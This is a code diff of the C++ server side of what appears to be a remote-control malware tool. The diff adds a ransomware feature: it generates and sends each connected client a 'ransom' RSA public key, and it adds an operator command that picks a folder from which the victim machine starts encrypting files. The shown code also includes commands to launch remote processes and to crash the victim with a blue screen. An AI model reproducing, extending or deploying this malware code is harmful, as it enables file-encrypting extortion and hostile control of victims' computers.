@@ -104,7 +104,9 @@ bool ServerInterface::ExchangeCryptoKeys(long cuid) {
     unsigned char* data = NULL; // public key as der format
 
     i2d_RSAPublicKey(this->m_SessionKeys.pub, &data);
+    
 
+    // send session public key
     int sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
     if ( sent <= 0 ) {
         free(data);
@@ -116,6 +118,26 @@ bool ServerInterface::ExchangeCryptoKeys(long cuid) {
         free(data);
         return false;
     }
+    std::cout << "sent session key" << std::endl;
+
+    // send ransom public key
+    len = i2d_RSAPublicKey(client->GetRansomSecrets().pub, nullptr);
+    data = NULL;
+    i2d_RSAPublicKey(client->GetRansomSecrets().pub, &data);
+
+    sent = Send(client->GetSocket(), ( char* ) &len, sizeof(len), 0); // Send size of private key first
+    if ( sent <= 0 ) {
+        free(data);
+        return false;
+    }
+    std::cout << "sent size of ransom key" << std::endl;
+
+    sent = Send(client->GetSocket(), ( char* ) data, len, 0); // send der format of rsa key
+    if ( sent <= 0 ) {
+        free(data);
+        return false;
+    }
+    std::cout << "sent ransom key" << std::endl;
 
     // now receive the public key
     int            clientLen = 0;
@@ -507,9 +529,11 @@ void ServerInterface::AcceptTCPConnections() {
  */
 void ServerInterface::OnTCPConnection(SOCKET connection, sockaddr_in incoming) {
     Client     client(connection, incoming);                  // create the client. generate the cuid
-    RSAKeys    ransomKeys = LGCrypto::GenerateRSAPair(4096); // generate rsa keys for the client
+    RSAKeys    ransomKeys = LGCrypto::GenerateRSAPair(2048); // generate rsa keys for the client
     BYTESTRING aesKey     = LGCrypto::Generate256AESKey();
     
+    std::cout << "client connected" << std::endl;
+
     client.SetRansomSecrets(ransomKeys);
     client.SetAESKey(aesKey);
     
@@ -556,6 +580,25 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
     cmdInfo.action = static_cast<Action>(command);
 
     switch ( command ) {
+    case Action::kRansomwareEnable: {
+        std::string input;
+        std::string confirmation;
+
+        std::cout << "Path to start searching files: ";
+        std::getline(std::cin, input);
+
+        std::cout << "Are you sure (YES or NO): ";
+        std::getline(std::cin, confirmation);
+
+        if ( confirmation != "YES" )
+            break;
+
+        cmdInfo.flags |= PACKET_IS_A_COMMAND;
+        cmdInfo.insert(input);
+
+        performed = true;
+        break;
+    }
     case Action::kOpenRemoteProcess: {
         std::string input;
 
@@ -568,9 +611,6 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
 
         cmdInfo.flags = GetFlagsFromInput(flagInput);
         cmdInfo.insert(input);
-
-        if ( cmdInfo.buffLen == -1 ) // error
-            break;
 
         performed = true;
         break;
@@ -587,9 +627,6 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         std::getline(std::cin, input);
         
         cmdInfo.insert(input);
-
-        if ( cmdInfo.buffLen == -1 )
-            break;
 
         performed = true;
         break;
@@ -612,7 +649,6 @@ bool ServerInterface::HandleUserInput(unsigned int command, Packet& outputComman
         performed = true;
         break;
     }
-    // no additional user input required 
     case Action::kRemoteBSOD:
         cmdInfo.flags = PACKET_IS_A_COMMAND | NO_CONSOLE;
         performed = true;
@@ -665,14 +701,13 @@ Packet ServerInterface::WaitForClientResponse(Client* client) {
     bool received = m_NetworkManager.ReceiveTCPLargeData(encrypted, client->GetSocket());
     m_NetworkManager.ResetSocketTimeout(client->GetSocket(), SO_RCVTIMEO);
 
-    if ( WSAGetLastError() == WSAETIMEDOUT ) {
+    if ( GetLastError() == WSAETIMEDOUT ) {
         response.code = ClientResponseCode::kTimeout;
         return response;
     }
 
-    if ( !received ) {
+    if ( !received )
         return {};
-    }
 
     response = LGCrypto::DecryptToStruct<Packet>(encrypted, client->GetAESKey());
     client->ExpectingResponse = FALSE;
